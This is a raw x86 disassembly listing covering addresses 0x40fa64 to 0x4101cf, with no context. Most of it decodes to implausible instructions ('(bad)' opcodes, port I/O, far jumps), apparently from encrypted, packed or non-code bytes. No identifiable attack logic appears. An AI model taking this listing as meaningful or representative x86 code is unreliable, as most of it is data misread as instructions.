  40fa64:	push   edi
  40fa65:	ret    
  40fa66:	adc    bh,BYTE PTR [eax+0x20]
  40fa69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6a:	test   DWORD PTR [ebp+0x2e],esi
  40fa6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa6e:	sbb    dl,BYTE PTR [eax+0x6c]
  40fa71:	jle    0x40fac0
  40fa73:	push   ebx
  40fa74:	sub    BYTE PTR [ebx+eiz*4+0x44f393fd],dl
  40fa7b:	loop   0x40fa14
  40fa7d:	sbb    eax,0x14609e4f
  40fa82:	xor    esi,DWORD PTR [eax]
  40fa84:	push   esp
  40fa85:	pop    es
  40fa86:	mov    eax,DWORD PTR [ebp-0x1eac1ee6]
  40fa8c:	jmp    0x40faa1
  40fa8e:	jmp    0xd119e028
  40fa93:	test   al,0xc0
  40fa95:	mov    eax,0x5083fe30
  40fa9a:	dec    ecx
  40fa9b:	jns    0x40fa83
  40fa9d:	popf   
  40fa9e:	nop
  40fa9f:	mov    DWORD PTR [ebp+0x4a79d909],ebp
  40faa5:	push   0xffffffec
  40faa7:	and    DWORD PTR [edx-0x1dc89f58],eax
  40faad:	mov    ch,0x27
  40faaf:	cmp    edx,DWORD PTR [edi]
  40fab1:	mov    cl,0x92
  40fab3:	inc    ebx
  40fab4:	jp     0x40fa71
  40fab6:	jo     0x40fa99
  40fab8:	dec    edx
  40fab9:	in     al,dx
  40faba:	retf   
  40fabb:	or     ecx,DWORD PTR [ebx-0x1f]
  40fabe:	mov    ebx,0xbe7c61ae
  40fac3:	push   ds
  40fac4:	dec    esi
  40fac5:	out    0x65,al
  40fac7:	popa   
  40fac8:	mov    esi,0x62e9f99
  40facd:	daa    
  40face:	mov    eax,ds:0x3cca1d88
  40fad3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40fad5:	push   ebp
  40fad6:	cmp    eax,0xe2ab52fe
  40fadb:	test   eax,0x33ed2853
  40fae0:	xchg   BYTE PTR [ebx+0xc34baf4],bl
  40fae6:	pop    edi
  40fae7:	add    cl,ah
  40fae9:	in     eax,dx
  40faea:	add    BYTE PTR [esi+0x34694813],dh
  40faf0:	mov    ebx,0x3c2e7b24
  40faf5:	(bad)  
  40faf6:	jg     0x40fafb
  40faf8:	aad    0x82
  40fafa:	cmp    al,0x1d
  40fafc:	nop
  40fafd:	data16 (bad) 
  40faff:	in     eax,0x2e
  40fb01:	jno    0x40faa3
  40fb03:	add    eax,0xd1485755
  40fb08:	sahf   
  40fb09:	sbb    ebx,ebx
  40fb0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb0c:	lods   eax,DWORD PTR ds:[esi]
  40fb0d:	adc    bh,BYTE PTR [edi]
  40fb0f:	ins    DWORD PTR es:[edi],dx
  40fb10:	push   0x4b5547aa
  40fb15:	sub    DWORD PTR [ebp+0x2b],0x7ac5525a
  40fb1c:	mov    dh,0x74
  40fb1e:	mov    ecx,0x28c09394
  40fb23:	xchg   ecx,eax
  40fb24:	mov    ds:0xd1038cc8,al
  40fb29:	and    eax,DWORD PTR ds:0x9fa01e2c
  40fb2f:	aad    0xe3
  40fb31:	shr    BYTE PTR [ecx+ebp*4-0x38],cl
  40fb35:	scas   al,BYTE PTR es:[edi]
  40fb36:	enter  0xba5c,0x18
  40fb3a:	and    eax,0x7c553ecb
  40fb3f:	fnstcw WORD PTR [ebp+0x4c3e9a52]
  40fb45:	in     al,dx
  40fb46:	outs   dx,BYTE PTR ds:[esi]
  40fb47:	adc    BYTE PTR [ebx+eax*2-0x67],al
  40fb4b:	(bad)  
  40fb4d:	fsubp  st(6),st
  40fb4f:	mov    eax,ds:0x1d48eef
  40fb54:	push   ds
  40fb55:	push   edi
  40fb56:	sahf   
  40fb57:	imul   edi,DWORD PTR [ebx+0x56b841a5],0xc3f7e49b
  40fb61:	(bad)  
  40fb63:	mov    ?,WORD PTR [ebp-0x504ef359]
  40fb69:	cmp    DWORD PTR [ecx-0x67],esp
  40fb6c:	lds    esi,FWORD PTR [edx-0x7c]
  40fb6f:	pop    edx
  40fb70:	sub    eax,0x309b0636
  40fb75:	into   
  40fb76:	dec    esp
  40fb77:	xchg   edx,eax
  40fb78:	or     ebx,DWORD PTR [edi-0x2356e461]
  40fb7e:	in     eax,0x1c
  40fb80:	xor    al,0x81
  40fb82:	cmp    al,0x63
  40fb84:	and    al,0xf0
  40fb86:	sbb    DWORD PTR [ebp+0x3f],0x6d0122
  40fb8d:	mov    cs,WORD PTR [ebp+0x66]
  40fb90:	cmp    dl,BYTE PTR [ebp+0x26]
  40fb93:	xchg   ebx,eax
  40fb94:	scas   eax,DWORD PTR es:[edi]
  40fb95:	sbb    dl,cl
  40fb97:	jmp    0x40fb36
  40fb99:	test   DWORD PTR [eax+0x74],edi
  40fb9c:	sbb    ebp,DWORD PTR ds:0x48dac510
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x53
  40fbc9:	sub    al,0x41
  40fbcb:	push   0xffffffd0
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fb69
  40fbd5:	mov    al,ds:0xc3895281
  40fbda:	mov    dh,0x93
  40fbdc:	jmp    0x8105:0x77528684
  40fbe3:	sar    BYTE PTR [ecx+eax*4-0x445a0272],cl
  40fbea:	adc    DWORD PTR [edi],eax
  40fbec:	sub    al,0xf7
  40fbee:	xor    al,0x4e
  40fbf0:	mov    al,BYTE PTR [esi-0x3c]
  40fbf3:	jno    0x40fc2d
  40fbf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf6:	gs xchg ebp,eax
  40fbf8:	mov    edx,0xc0062929
  40fbfd:	or     eax,DWORD PTR [edi]
  40fbff:	in     eax,dx
  40fc00:	xor    DWORD PTR [edi-0x47],eax
  40fc03:	push   ds
  40fc04:	xchg   ecx,eax
  40fc05:	mov    edi,ebp
  40fc07:	cdq    
  40fc08:	(bad)  
  40fc09:	in     al,0x5b
  40fc0b:	dec    eax
  40fc0c:	cmp    ch,BYTE PTR [eax+0x7a]
  40fc0f:	jmp    DWORD PTR [eax+0x3e]
  40fc12:	or     esi,DWORD PTR [esi]
  40fc14:	adc    BYTE PTR [ecx+0x5],dl
  40fc17:	push   ds
  40fc18:	nop
  40fc19:	inc    edi
  40fc1a:	push   ds
  40fc1b:	mov    dl,0x94
  40fc1d:	sub    ecx,DWORD PTR [edi-0x4f]
  40fc20:	pop    esi
  40fc21:	idiv   ebp
  40fc23:	lods   eax,DWORD PTR ds:[esi]
  40fc24:	aas    
  40fc25:	mov    ds:0xc76eca1a,al
  40fc2a:	aaa    
  40fc2b:	jge    0x40fbd1
  40fc2d:	pushf  
  40fc2e:	mov    ecx,fs
  40fc30:	ficom  WORD PTR ds:0x3b5bf3b6
  40fc36:	pop    edi
  40fc37:	fsub   QWORD PTR [edx+0x64e042bd]
  40fc3d:	adc    DWORD PTR [edi-0x35],esp
  40fc40:	xchg   ecx,eax
  40fc41:	mov    ?,WORD PTR [ebx]
  40fc43:	jb     0x40fc0b
  40fc45:	rol    DWORD PTR [esi],1
  40fc47:	(bad)  
  40fc48:	jmp    0x40fbd6
  40fc4a:	mov    ebp,0xd2bc6573
  40fc4f:	out    0x5,eax
  40fc51:	popa   
  40fc52:	xor    al,0x5c
  40fc54:	neg    BYTE PTR [ebx]
  40fc56:	jnp    0x40fc31
  40fc58:	inc    esi
  40fc59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc5a:	idiv   BYTE PTR [ecx+0x53e37ec6]
  40fc60:	mov    eax,0xb6c01da3
  40fc65:	dec    ebx
  40fc66:	call   0xaa9c936d
  40fc6b:	std    
  40fc6c:	pop    es
  40fc6d:	jle    0x40fcb1
  40fc6f:	in     al,dx
  40fc70:	jnp    0x40fc51
  40fc72:	lea    ebp,[eax+0x36f87fc4]
  40fc78:	push   ebx
  40fc79:	ins    BYTE PTR es:[edi],dx
  40fc7a:	sub    esi,DWORD PTR [esi-0x25]
  40fc7d:	cli    
  40fc7e:	loop   0x40fcca
  40fc80:	sbb    ah,BYTE PTR [esi]
  40fc82:	xor    eax,0x29f3139e
  40fc87:	xor    al,BYTE PTR [esp+edi*8]
  40fc8a:	mov    ah,0xd
  40fc8c:	mov    BYTE PTR es:[edi-0x3c],0x37
  40fc91:	xor    ch,dh
  40fc93:	mov    dl,0xb3
  40fc95:	jle    0x40fcf6
  40fc97:	sub    ah,bh
  40fc99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc9a:	sbb    al,0x88
  40fc9c:	out    dx,al
  40fc9d:	outs   dx,BYTE PTR ds:[esi]
  40fc9e:	pop    edx
  40fc9f:	fs aad 0x53
  40fca2:	push   esi
  40fca3:	mov    bl,0x94
  40fca5:	lods   eax,DWORD PTR ds:[esi]
  40fca6:	(bad)  
  40fca7:	or     eax,0xe02cccb7
  40fcac:	pop    ds
  40fcad:	fwait
  40fcae:	cmp    DWORD PTR ds:0x78193bda,esp
  40fcb4:	out    dx,al
  40fcb5:	inc    esp
  40fcb6:	pusha  
  40fcb7:	xchg   edx,eax
  40fcb8:	sub    bh,BYTE PTR [ecx-0x1ff9f55]
  40fcbe:	imul   eax,esi,0xa
  40fcc1:	inc    esp
  40fcc2:	inc    ebx
  40fcc3:	int3   
  40fcc4:	gs rol BYTE PTR ss:[edx],cl
  40fcc8:	cmp    al,0xa1
  40fcca:	ss ins DWORD PTR es:[edi],dx
  40fccc:	jle    0x40fcdc
  40fcce:	iret   
  40fccf:	jp     0x40fd17
  40fcd1:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcd3:	popa   
  40fcd4:	xchg   ebp,eax
  40fcd5:	cmp    al,0x87
  40fcd7:	div    BYTE PTR [edi]
  40fcd9:	mov    ebp,0xc7ad46ab
  40fcde:	out    0x86,eax
  40fce0:	inc    ebp
  40fce1:	mov    edi,0xd27d175
  40fce6:	aam    0xb0
  40fce8:	in     al,dx
  40fce9:	mov    ah,BYTE PTR [edi-0x45]
  40fcec:	fsubr  QWORD PTR [edi]
  40fcee:	inc    ebx
  40fcef:	and    eax,0x46ef00be
  40fcf4:	pop    ecx
  40fcf5:	out    dx,eax
  40fcf6:	sbb    esi,eax
  40fcf8:	aam    0xc3
  40fcfa:	cmp    eax,0x843c2c11
  40fcff:	sahf   
  40fd00:	bound  ecx,QWORD PTR [eax]
  40fd02:	add    eax,0x3d821034
  40fd07:	xchg   esi,eax
  40fd08:	stos   DWORD PTR es:[edi],eax
  40fd09:	stos   BYTE PTR es:[edi],al
  40fd0a:	bound  eax,QWORD PTR [ebx]
  40fd0c:	lea    ebp,[edi]
  40fd0e:	leave  
  40fd0f:	adc    cl,BYTE PTR [ecx-0x6b]
  40fd12:	fucom  st(5)
  40fd14:	cli    
  40fd15:	push   edx
  40fd16:	dec    ecx
  40fd17:	je     0x40fccf
  40fd19:	sti    
  40fd1a:	ss jno 0x40fd99
  40fd1d:	or     al,0x28
  40fd1f:	pop    es
  40fd20:	mov    ebp,0x9682eaa2
  40fd25:	push   cs
  40fd26:	jecxz  0x40fd09
  40fd28:	test   BYTE PTR [edx-0x301a79e9],bl
  40fd2e:	xchg   ebp,eax
  40fd2f:	inc    esi
  40fd30:	pushf  
  40fd31:	and    DWORD PTR [ebx+0x469101ba],edx
  40fd37:	push   0xffffff9a
  40fd39:	jns    0x40fcd9
  40fd3b:	sub    al,0x22
  40fd3d:	or     BYTE PTR [ebx-0x7f3a69a3],cl
  40fd43:	fs sbb al,0x57
  40fd46:	mov    esi,0xcadb40a2
  40fd4b:	adc    al,0xd9
  40fd4d:	jo     0x40fd32
  40fd4f:	popf   
  40fd50:	in     eax,dx
  40fd51:	call   0xfb505bc3
  40fd56:	push   edi
  40fd57:	mov    cl,0x1c
  40fd59:	mov    edx,0x9ea000ee
  40fd5e:	jmp    0x1746:0xb37de185
  40fd65:	cmp    al,0x7f
  40fd67:	(bad)  
  40fd68:	sbb    eax,0x3750a304
  40fd6d:	or     DWORD PTR [eax],edx
  40fd6f:	sbb    cl,BYTE PTR [ebx+0x7e]
  40fd72:	loopne 0x40fd2e
  40fd74:	push   ebx
  40fd75:	inc    esp
  40fd76:	cdq    
  40fd77:	xchg   BYTE PTR [ebx+0x31a9699f],bh
  40fd7d:	je     0x40fd8e
  40fd7f:	or     eax,0xc15bf1f8
  40fd84:	test   eax,0x742d592f
  40fd89:	jle    0x40fdaa
  40fd8b:	cmp    bl,al
  40fd8d:	dec    ecx
  40fd8e:	pop    edx
  40fd8f:	call   0x7eeb132e
  40fd94:	nop
  40fd95:	sbb    al,0x23
  40fd97:	inc    esp
  40fd98:	sbb    al,0x3b
  40fd9a:	test   BYTE PTR [eax+0x7d45e5e1],ch
  40fda0:	push   edi
  40fda1:	xchg   esp,eax
  40fda2:	add    DWORD PTR [edi+ebx*2],eax
  40fda5:	xchg   esp,eax
  40fda6:	ins    BYTE PTR es:[edi],dx
  40fda7:	outs   dx,DWORD PTR ds:[esi]
  40fda8:	lds    esp,FWORD PTR [edx+0x50af08e0]
  40fdae:	and    eax,0x44f5060b
  40fdb3:	shl    bh,0x2a
  40fdb6:	int    0x9d
  40fdb8:	xor    dl,BYTE PTR [ebx]
  40fdba:	or     al,0x8b
  40fdbc:	in     eax,dx
  40fdbd:	dec    edx
  40fdbe:	psubusb mm2,QWORD PTR [eax-0x34]
  40fdc2:	mov    cs,WORD PTR [ecx+ebx*4-0x32d2358c]
  40fdc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdca:	push   ds
  40fdcb:	cmp    BYTE PTR [edx-0x8a02715],0xda
  40fdd2:	iret   
  40fdd3:	rcl    DWORD PTR [ecx],cl
  40fdd5:	mov    BYTE PTR [ecx+edx*8+0x31],0x3d
  40fdda:	adc    bl,dh
  40fddc:	in     al,dx
  40fddd:	cmp    al,0x77
  40fddf:	addr16 jbe 0x40fd91
  40fde2:	cmc    
  40fde3:	or     eax,0xefa5e83
  40fde8:	int3   
  40fde9:	mov    bl,0xfb
  40fdeb:	push   ecx
  40fdec:	lods   al,BYTE PTR ds:[esi]
  40fded:	pop    eax
  40fdee:	mov    BYTE PTR [eax+ecx*2-0x29],bh
  40fdf2:	call   0xce1b:0xe05c8da
  40fdf9:	mov    ecx,0x75ed12f2
  40fdfe:	bound  eax,QWORD PTR [eax+ebx*1-0x4]
  40fe02:	pop    es
  40fe03:	ins    BYTE PTR es:[edi],dx
  40fe04:	ror    BYTE PTR [edx],cl
  40fe06:	test   BYTE PTR [ecx+0x230fcdaf],dh
  40fe0c:	pop    ecx
  40fe0d:	sub    bl,0x83
  40fe10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe11:	mov    esi,0x503271f0
  40fe16:	mov    esi,DWORD PTR [ecx+0x6d35b80b]
  40fe1c:	jg     0x40fdf8
  40fe1e:	int3   
  40fe1f:	js     0x40fe72
  40fe21:	ins    BYTE PTR es:[edi],dx
  40fe22:	repz jmp 0x79c:0xb55739b2
  40fe2a:	sbb    DWORD PTR [edx],eax
  40fe2c:	les    ecx,FWORD PTR [ecx-0x2b]
  40fe2f:	ins    BYTE PTR es:[edi],dx
  40fe30:	push   0x5a6bf0c5
  40fe35:	cmp    DWORD PTR [esi-0x57f35a98],0x8ef12edb
  40fe3f:	outs   dx,DWORD PTR ds:[esi]
  40fe40:	add    DWORD PTR [ebp+0x36a8fec5],eax
  40fe46:	lea    edi,[esp+ecx*1]
  40fe49:	jecxz  0x40fe3e
  40fe4b:	mov    eax,?
  40fe4d:	loopne 0x40fec6
  40fe4f:	sub    BYTE PTR [eax+esi*2+0x49],0x88
  40fe54:	pop    esi
  40fe55:	jne    0x40fecf
  40fe57:	lock mov bl,0x4
  40fe5a:	rol    BYTE PTR [esi-0x6d],1
  40fe5d:	push   ds
  40fe5e:	pmullw mm6,QWORD PTR [edx+0x7ae45730]
  40fe65:	shl    BYTE PTR [ebp+0x3ad41cad],cl
  40fe6b:	push   ebp
  40fe6c:	pop    edx
  40fe6d:	add    al,al
  40fe6f:	inc    ecx
  40fe70:	jmp    0x40fe14
  40fe72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe73:	mov    eax,0x4705b124
  40fe78:	xor    DWORD PTR ds:0x1ee3e770,edi
  40fe7e:	retf   0xb2b9
  40fe81:	mov    bh,0x78
  40fe83:	and    BYTE PTR [edx-0x75],ah
  40fe86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe87:	aad    0x7e
  40fe89:	loop   0x40fe37
  40fe8b:	pop    esi
  40fe8c:	dec    esi
  40fe8d:	xor    esi,DWORD PTR [ecx+0x466c553a]
  40fe93:	mov    esi,0xce1bc13d
  40fe98:	push   edi
  40fe99:	into   
  40fe9a:	xchg   edi,eax
  40fe9b:	pop    ebx
  40fe9c:	push   edx
  40fe9d:	jle    0x40fef1
  40fe9f:	out    0x29,eax
  40fea1:	jmp    0x4c8488eb
  40fea6:	sub    cl,dl
  40fea8:	icebp  
  40fea9:	test   al,0x91
  40feab:	sub    al,0x19
  40fead:	pop    ecx
  40feae:	adc    dl,BYTE PTR [ecx-0x40]
  40feb1:	in     eax,dx
  40feb2:	add    BYTE PTR [ebp+0xe371173],ch
  40feb8:	and    DWORD PTR [edx],0xfb3aceca
  40febe:	and    BYTE PTR [eax-0x5038ec91],0x2a
  40fec5:	dec    esi
  40fec6:	jno    0x40fe6b
  40fec8:	cli    
  40fec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feca:	cld    
  40fecb:	mov    ch,0x95
  40fecd:	ins    DWORD PTR es:[edi],dx
  40fece:	mov    ss,ebp
  40fed0:	nop
  40fed1:	push   ss
  40fed2:	test   DWORD PTR [esi+0x6],0xc458b1b
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xcfb14346
  40fef3:	lods   eax,DWORD PTR ds:[esi]
  40fef4:	sub    ebx,esi
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40feec
  40fefe:	lahf   
  40feff:	add    DWORD PTR [eax+0x379788b],0xffffffcd
  40ff06:	adc    bh,BYTE PTR [bp+si]
  40ff09:	push   edi
  40ff0a:	pop    ds
  40ff0b:	shl    BYTE PTR [edi+ebx*4],0x6b
  40ff0f:	mov    dh,BYTE PTR [esi+0x5ca228a]
  40ff15:	fnstenv [edx]
  40ff17:	push   esi
  40ff18:	(bad)  
  40ff19:	cwde   
  40ff1a:	jns    0x40ff64
  40ff1c:	pop    ebp
  40ff1d:	push   0x4b346e31
  40ff22:	adc    bh,BYTE PTR [edi+eax*1-0x5d]
  40ff26:	push   edx
  40ff27:	neg    DWORD PTR [eax+0x195c7dc5]
  40ff2d:	or     al,0xd4
  40ff2f:	(bad)  
  40ff30:	jmp    0x21f5355c
  40ff35:	mov    dl,0xfc
  40ff37:	enter  0x8a72,0x18
  40ff3b:	shl    ah,cl
  40ff3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff3e:	stc    
  40ff3f:	js     0x40ff4c
  40ff41:	clc    
  40ff42:	in     al,0x22
  40ff44:	test   DWORD PTR [eax],ebp
  40ff46:	popf   
  40ff47:	sub    BYTE PTR [ebp+0x77361ff8],0x82
  40ff4e:	mov    dh,0x88
  40ff50:	sbb    DWORD PTR [ebp+esi*1+0x47090393],edx
  40ff57:	and    DWORD PTR [ebx],ebx
  40ff59:	mov    ecx,0xf34a38e
  40ff5e:	dec    ebx
  40ff5f:	inc    esp
  40ff60:	add    bl,BYTE PTR [ebx+0x78]
  40ff63:	dec    ebx
  40ff64:	(bad)  
  40ff65:	gs inc edx
  40ff67:	lahf   
  40ff68:	leave  
  40ff69:	push   edi
  40ff6a:	mov    ch,0x40
  40ff6c:	cmp    DWORD PTR [edi-0x25],esi
  40ff6f:	jb     0x40ff56
  40ff71:	push   ds
  40ff72:	popf   
  40ff73:	arpl   WORD PTR [edi-0x1c],ax
  40ff76:	cmp    dh,cl
  40ff78:	test   al,0xde
  40ff7a:	dec    esi
  40ff7b:	neg    DWORD PTR [edx-0x35]
  40ff7e:	shr    DWORD PTR [ebx],0xf5
  40ff81:	in     al,0xba
  40ff83:	mov    cl,0xbd
  40ff85:	cmp    eax,0x53164391
  40ff8a:	mov    edx,0x14fad8f5
  40ff8f:	(bad)  
  40ff90:	retw   
  40ff92:	inc    ecx
  40ff93:	test   BYTE PTR [esi-0x41c277ff],0xb5
  40ff9a:	sbb    BYTE PTR [esi+ebx*4+0x568cd57a],bh
  40ffa1:	mov    dh,0xd6
  40ffa3:	scas   al,BYTE PTR es:[edi]
  40ffa4:	in     eax,dx
  40ffa5:	xor    ebp,DWORD PTR [edi+0x5fe26e65]
  40ffab:	or     DWORD PTR [edi-0x784c4aa3],0xffffffdc
  40ffb2:	xor    edx,esi
  40ffb4:	outs   dx,DWORD PTR ds:[esi]
  40ffb5:	mov    ebx,0x1d7fe478
  40ffba:	test   DWORD PTR [edx+0x20d6191],ecx
  40ffc0:	xor    BYTE PTR [edi-0x5b],bl
  40ffc3:	sti    
  40ffc4:	shl    DWORD PTR [ebp+0x10],cl
  40ffc7:	xor    dh,dl
  40ffc9:	and    eax,0x5362d5ed
  40ffce:	lds    ebx,FWORD PTR [edx-0x45e536f2]
  40ffd4:	aaa    
  40ffd5:	cmp    eax,0xe4d0284c
  40ffda:	lea    ecx,[ebp-0x50]
  40ffdd:	and    edi,ebp
  40ffdf:	lahf   
  40ffe0:	dec    edx
  40ffe1:	mov    bl,0x91
  40ffe3:	aaa    
  40ffe4:	das    
  40ffe5:	dec    eax
  40ffe6:	mov    bh,0x0
  40ffe8:	dec    eax
  40ffe9:	fdiv   DWORD PTR [ebx-0x1b]
  40ffec:	fild   DWORD PTR [edx]
  40ffee:	mov    edi,DWORD PTR [edx-0x16]
  40fff1:	inc    esi
  40fff2:	pop    es
  40fff3:	or     dl,BYTE PTR [eax]
  40fff5:	les    edx,FWORD PTR [eax-0x130cf1ab]
  40fffb:	call   0xe02201cc
  410000:	ins    DWORD PTR es:[edi],dx
  410001:	fcmovne st,st(2)
  410003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410004:	inc    ebx
  410005:	retf   
  410006:	outs   dx,DWORD PTR ds:[esi]
  410007:	cwde   
  410008:	mov    ch,0x29
  41000a:	iret   
  41000b:	or     bl,bl
  41000d:	mov    dl,0xf8
  41000f:	inc    esp
  410010:	and    eax,0xbad5697
  410015:	loope  0x40ff98
  410017:	mov    al,0x9b
  410019:	xchg   DWORD PTR [esi],ebx
  41001b:	(bad)  
  41001c:	loop   0x40ffad
  41001e:	ret    0x590f
  410021:	cmp    ebp,DWORD PTR [edx-0x14]
  410024:	rcr    bh,0x70
  410027:	inc    edi
  410028:	mov    ecx,0xc2e01193
  41002d:	setns  BYTE PTR [ebx]
  410030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410031:	es pushf 
  410033:	cli    
  410034:	call   0x24e5101
  410039:	daa    
  41003a:	mov    al,ds:0x48673743
  41003f:	jns    0x410013
  410041:	xchg   ebx,eax
  410042:	sbb    al,dl
  410044:	sub    BYTE PTR [edx+0x14b8fe35],ch
  41004a:	mov    ebp,0xe62247cf
  41004f:	xchg   ebx,eax
  410050:	add    BYTE PTR [ebx+0x40787364],bl
  410056:	add    al,0xa9
  410058:	xor    dh,BYTE PTR [ecx-0x29]
  41005b:	add    esi,DWORD PTR ds:0x1886478a
  410061:	dec    edi
  410062:	mov    al,0x5f
  410064:	xchg   ebp,eax
  410065:	mov    ecx,0x528225cb
  41006a:	push   eax
  41006b:	sub    edi,ebx
  41006d:	icebp  
  41006e:	fld    QWORD PTR [ebx]
  410070:	cdq    
  410071:	add    ch,bl
  410073:	pop    esp
  410074:	cmp    BYTE PTR [ebx+0x65],cl
  410077:	xchg   ecx,eax
  410078:	push   esp
  410079:	rol    cl,0xb2
  41007c:	daa    
  41007d:	pop    ebx
  41007e:	adc    BYTE PTR [edx],ah
  410080:	scas   al,BYTE PTR es:[edi]
  410081:	adc    BYTE PTR [edx-0x4ff68af6],bh
  410087:	xor    eax,0x9c9f441
  41008c:	pop    ecx
  41008d:	sub    eax,0x2de84b52
  410092:	xor    BYTE PTR [eax+ebp*2],ch
  410095:	jbe    0x4100cc
  410097:	inc    esp
  410098:	ja     0x4100df
  41009a:	inc    ebx
  41009b:	and    eax,0x466e947c
  4100a0:	fs ret 
  4100a2:	dec    edx
  4100a3:	cmp    ah,bl
  4100a5:	mov    al,0x2c
  4100a7:	mov    DWORD PTR [ecx],ebx
  4100a9:	call   0x5030:0x525a3441
  4100b0:	jne    0x410033
  4100b2:	push   eax
  4100b3:	push   es
  4100b4:	jns    0x4100ce
  4100b6:	scas   eax,DWORD PTR es:[edi]
  4100b7:	push   ds
  4100b8:	fst    QWORD PTR [ebx+0x7d]
  4100bb:	loopne 0x410101
  4100bd:	(bad)  
  4100c0:	add    DWORD PTR [ecx-0x3c5057ed],0x2ac4e1fd
  4100ca:	mov    eax,0x53456c43
  4100cf:	fidivr WORD PTR [edi-0x72984690]
  4100d5:	cmc    
  4100d6:	jmp    0x410120
  4100d8:	or     DWORD PTR [ebx-0x3],ecx
  4100db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100dc:	int    0x51
  4100de:	mov    eax,0x4008aced
  4100e3:	jl     0x41010d
  4100e5:	mov    al,ds:0xa1cb26ec
  4100ea:	xchg   esi,eax
  4100eb:	int3   
  4100ec:	ret    
  4100ed:	push   ebx
  4100ee:	cmp    BYTE PTR [edi],bl
  4100f0:	lea    ecx,[edi]
  4100f2:	pop    edx
  4100f3:	sub    eax,0xddbed2c4
  4100f8:	jmp    0x6880:0x2094a9f2
  4100ff:	sub    BYTE PTR [ebx+0x7814633],dh
  410105:	rdmsr  
  410107:	adc    bl,bh
  410109:	push   esp
  41010a:	or     DWORD PTR [esi+0x21],esi
  41010d:	sti    
  41010e:	jle    0x410092
  410110:	sub    DWORD PTR [edi+0x20f76b35],ebp
  410116:	(bad)  
  410118:	call   0xa4605ec2
  41011d:	dec    esp
  41011e:	repz out dx,al
  410120:	dec    ecx
  410121:	ins    BYTE PTR es:[edi],dx
  410122:	lea    ecx,[eax+0x3e]
  410125:	push   ds
  410126:	dec    edx
  410127:	test   al,0x3e
  410129:	test   BYTE PTR [ebx+ebp*4],ah
  41012c:	out    0x0,al
  41012e:	pcmpgtd mm0,QWORD PTR [ebx+0x3f0e8fb2]
  410135:	mov    bh,0xd4
  410137:	xchg   DWORD PTR [ebp+0x5f],ebp
  41013a:	add    ebp,ecx
  41013c:	cwde   
  41013d:	addr16 (bad) 
  41013f:	xchg   edx,eax
  410140:	(bad)  [esi-0xab85daf]
  410146:	and    al,0xac
  410148:	sub    ebp,DWORD PTR [ecx-0x5f]
  41014b:	jb     0x410181
  41014d:	mov    edi,0x5e28527b
  410152:	out    0x9c,eax
  410154:	push   cs
  410155:	mov    WORD PTR [esi+0x1445471a],?
  41015b:	xchg   DWORD PTR [edx-0x28],ebx
  41015e:	div    BYTE PTR [ebx-0x6b]
  410161:	pusha  
  410162:	jne    0x410142
  410164:	or     al,0x76
  410166:	dec    edx
  410167:	(bad)  
  410169:	dec    ecx
  41016a:	cmp    eax,DWORD PTR [esi-0x19]
  41016d:	push   edi
  41016e:	fdiv   DWORD PTR [eax-0x55]
  410171:	fs add dl,dl
  410174:	adc    ah,ch
  410176:	xchg   ebx,eax
  410177:	push   edx
  410178:	popa   
  410179:	cs hlt 
  41017b:	pop    eax
  41017c:	lahf   
  41017d:	ficomp WORD PTR [eax+0x7c7807d4]
  410183:	and    edi,DWORD PTR [esp+eax*8+0x37]
  410187:	ret    0x5268
  41018a:	cmp    BYTE PTR [esi-0x5cd2d3d5],ch
  410190:	mov    al,0x10
  410192:	fcos   
  410194:	push   esi
  410195:	inc    esp
  410196:	mov    bh,0x1a
  410198:	sub    BYTE PTR [edx],cl
  41019a:	adc    eax,0xfb61c898
  41019f:	lahf   
  4101a0:	gs dec ax
  4101a3:	dec    eax
  4101a4:	xchg   ebx,edi
  4101a6:	(bad)  
  4101a7:	jg     0x4101cd
  4101a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101aa:	call   0x5b9b94b0
  4101af:	sbb    ch,BYTE PTR [esi+0x50]
  4101b2:	jp     0x41021c
  4101b4:	imul   BYTE PTR [eax]
  4101b6:	loop   0x4101f5
  4101b8:	retf   0xa3ed
  4101bb:	out    0x50,eax
  4101bd:	fwait
  4101be:	push   0x3
  4101c0:	push   eax
  4101c1:	push   edi
  4101c2:	xchg   esi,eax
  4101c3:	dec    esp
  4101c4:	jns    0x4101ea
  4101c6:	hlt    
  4101c7:	push   ebp
  4101c8:	pop    ecx
  4101c9:	mov    DWORD PTR [edx],edx
  4101cb:	adc    esi,DWORD PTR [ecx-0x72]
  4101ce:	pop    ebp
  4101cf:	hlt    
